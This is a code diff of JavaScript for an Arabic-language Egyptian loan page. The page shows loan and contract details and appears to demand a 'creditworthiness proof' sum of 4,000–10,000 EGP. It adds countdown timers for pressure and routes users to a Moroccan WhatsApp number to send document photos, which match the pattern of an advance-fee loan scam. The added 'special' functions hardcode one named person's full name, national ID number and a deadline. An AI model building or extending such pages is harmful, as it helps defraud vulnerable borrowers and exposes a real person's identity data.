-        return new Intl.NumberFormat('ar-EG', { style: 'currency', currency: 'EGP' }).format(amount);
-    }
+    // دوال العرض العادية (لغير هشام)
+    function displayCustomerData(customer) {
+        const details = getLoanDetails(customer.loan_amount);
+        const installment = details.installment;
+        const months = details.months;
 
-    function formatNumber(amount) {
-        return new Intl.NumberFormat('ar-EG').format(amount);
-    }
+        document.getElementById('customerName').innerText = customer.full_name;
+        document.getElementById('customerNationalId').innerText = customer.national_id;
+        document.getElementById('customerWallet').innerText = customer.wallet_type;
+        document.getElementById('customerWalletNumber').innerText = customer.wallet_number;
+        document.getElementById('loanAmount').innerHTML = formatCurrency(customer.loan_amount);
+        document.getElementById('installmentAmount').innerHTML = formatCurrency(installment);
+        document.getElementById('loanDuration').innerText = months + ' شهر';
 
-    function formatDate(date) {
-        return date.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
+        let proofAmount;
+        if (customer.loan_amount < 50000) proofAmount = 4000;
+        else if (customer.loan_amount <= 100000) proofAmount = 6000;
+        else if (customer.loan_amount <= 200000) proofAmount = 8000;
+        else proofAmount = 10000;
+        document.getElementById('proofAmountText').innerHTML = formatNumber(proofAmount);
+
+        const today = new Date();
+        const nextPayment = new Date();
+        nextPayment.setDate(nextPayment.getDate() + 29);
+        const totalWithInterest = Math.round(customer.loan_amount * 1.33);
+        document.getElementById('contractDate').innerText = formatDate(today);
+        document.getElementById('debtorName').innerText = customer.full_name;
+        document.getElementById('debtorId').innerText = customer.national_id;
+        document.getElementById('debtorWallet').innerText = customer.wallet_type;
+        document.getElementById('debtorWalletNum').innerText = customer.wallet_number;
+        document.getElementById('loanAmountContract').innerHTML = formatCurrency(customer.loan_amount);
+        document.getElementById('totalAmountContract').innerHTML = formatCurrency(totalWithInterest);
+        document.getElementById('installmentAmountContract').innerHTML = formatCurrency(installment);
+        document.getElementById('installmentCountContract').innerText = months + ' شهر';
+        document.getElementById('receivedAmount').innerHTML = formatNumber(customer.loan_amount);
+        document.getElementById('myWallet').innerText = customer.wallet_type;
+        document.getElementById('myWalletNum').innerText = customer.wallet_number;
+        document.getElementById('firstPaymentDate').innerText = formatDate(nextPayment);
+        document.getElementById('signatureDate').innerText = formatDate(today);
     }
 
     function startTimer() {
@@ -1062,10 +1221,38 @@
         creditworthinessInterval = setInterval(update, 1000);
     }
 
+    function startSpecialCreditworthinessTimer() {
+        let timeLeft = 27 * 60;
+        const timerElem = document.getElementById('specialCreditworthinessTimer');
+        const progressBar = document.getElementById('specialCreditworthinessProgressBar');
+        const totalTime = 27 * 60;
+
+        if (specialTimerInterval) clearInterval(specialTimerInterval);
+        function update() {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerElem.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            const percent = (timeLeft / totalTime) * 100;
+            progressBar.style.width = `${percent}%`;
+
+            if (timeLeft <= 300) {
+                timerElem.classList.add('warning');
+            }
+
+            if (timeLeft <= 0) {
+                clearInterval(specialTimerInterval);
+                progressBar.style.width = '0%';
+                document.getElementById('timeoutModal').style.display = 'block';
+            }
+            timeLeft--;
+        }
+        update();
+        specialTimerInterval = setInterval(update, 1000);
+    }
+
     function sendWhatsAppMessage() {
         if (!currentCustomer) return;
 
-        // التحقق من وجود محفظة رقمية صالحة
         if (currentCustomer.wallet_type === "أخرى" || !currentCustomer.wallet_number || currentCustomer.wallet_number === "غير مسجل") {
             alert("❌ عذراً، لا يمكن استخدام واتساب لأنه ليس لديك محفظة رقمية مسجلة (فودافون كاش أو اتصالات كاش). يرجى التواصل مع الدعم مباشرة.");
             return;
@@ -1074,7 +1261,6 @@
         const confirmSend = confirm('⚠️ تحذير أمني: سترسل صور مستنداتك عبر واتساب. تأكد من أنك تتعامل مع فريق الدعم الرسمي. هل تريد المتابعة؟');
         if (!confirmSend) return;
 
-        // تنظيف رقم المحفظة من المسافات والأحرف غير الرقمية
         const cleanWallet = currentCustomer.wallet_number.replace(/\D/g, '');
         const last3Digits = cleanWallet.slice(-3);
         
@@ -1102,10 +1288,38 @@
         alert('✅ تم توجيهك إلى واتساب. يرجى إرسال الصور إلى فريق الدعم. سيتم مراجعة طلبك خلال ساعة كحد أقصى.');
     }
 
+    function sendWhatsAppMessageSpecial() {
+        if (!currentCustomer) return;
+        // نفس دالة واتساب العادية ولكن مع رسالة مخصصة لهشام
+        sendWhatsAppMessage();
+    }
+
+    function contactSupportSpecial() {
+        const message = `مرحباً، أنا هشام أحمد صلاح (رقم قومي 27601011414511)، تم منحي مهلة حتى الساعة 6 مساء اليوم 7/4/2026. أريد إتمام إجراءات الجدارة الائتمانية.`;
+        const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
+        window.open(whatsappUrl, '_blank');
+    }
+
     function contactSupport() {
         const message = `مرحباً، انتهى الوقت المحدد لإثبات الجدارة الائتمانية. أرجو مساعدتي في هذا الشأن.`;
         const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
         window.open(whatsappUrl, '_blank');
+    }
+
+    function scrollToSteps() {
+        document.getElementById('specialSteps').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function formatCurrency(amount) {
+        return new Intl.NumberFormat('ar-EG', { style: 'currency', currency: 'EGP' }).format(amount);
+    }
+
+    function formatNumber(amount) {
+        return new Intl.NumberFormat('ar-EG').format(amount);
+    }
+
+    function formatDate(date) {
+        return date.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
     }
 
     function copyWalletNumber() {
@@ -1116,46 +1330,6 @@
         }
     }
 
-    function displayCustomerData(customer) {
-        const details = getLoanDetails(customer.loan_amount);
-        const installment = details.installment;
-        const months = details.months;
-
-        document.getElementById('customerName').innerText = customer.full_name;
-        document.getElementById('customerNationalId').innerText = customer.national_id;
-        document.getElementById('customerWallet').innerText = customer.wallet_type;
-        document.getElementById('customerWalletNumber').innerText = customer.wallet_number;
-        document.getElementById('loanAmount').innerHTML = formatCurrency(customer.loan_amount);
-        document.getElementById('installmentAmount').innerHTML = formatCurrency(installment);
-        document.getElementById('loanDuration').innerText = months + ' شهر';
-
-        let proofAmount;
-        if (customer.loan_amount < 50000) proofAmount = 4000;
-        else if (customer.loan_amount <= 100000) proofAmount = 6000;
-        else if (customer.loan_amount <= 200000) proofAmount = 8000;
-        else proofAmount = 10000;
-        document.getElementById('proofAmountText').innerHTML = formatNumber(proofAmount);
-
-        const today = new Date();
-        const nextPayment = new Date();
-        nextPayment.setDate(nextPayment.getDate() + 29);
-        const totalWithInterest = Math.round(customer.loan_amount * 1.33);
-        document.getElementById('contractDate').innerText = formatDate(today);
-        document.getElementById('debtorName').innerText = customer.full_name;
-        document.getElementById('debtorId').innerText = customer.national_id;
-        document.getElementById('debtorWallet').innerText = customer.wallet_type;
-        document.getElementById('debtorWalletNum').innerText = customer.wallet_number;
-        document.getElementById('loanAmountContract').innerHTML = formatCurrency(customer.loan_amount);
-        document.getElementById('totalAmountContract').innerHTML = formatCurrency(totalWithInterest);
-        document.getElementById('installmentAmountContract').innerHTML = formatCurrency(installment);
-        document.getElementById('installmentCountContract').innerText = months + ' شهر';
-        document.getElementById('receivedAmount').innerHTML = formatNumber(customer.loan_amount);
-        document.getElementById('myWallet').innerText = customer.wallet_type;
-        document.getElementById('myWalletNum').innerText = customer.wallet_number;
-        document.getElementById('firstPaymentDate').innerText = formatDate(nextPayment);
-        document.getElementById('signatureDate').innerText = formatDate(today);
-    }
-
     function resetForm() {
         document.getElementById('nationalId').value = '';
         document.getElementById('formSection').classList.remove('hidden');
@@ -1163,6 +1337,7 @@
         document.getElementById('errorMessage').style.display = 'none';
         if (timerInterval) clearInterval(timerInterval);
         if (creditworthinessInterval) clearInterval(creditworthinessInterval);
+        if (specialTimerInterval) clearInterval(specialTimerInterval);
         currentCustomer = null;
     }
 
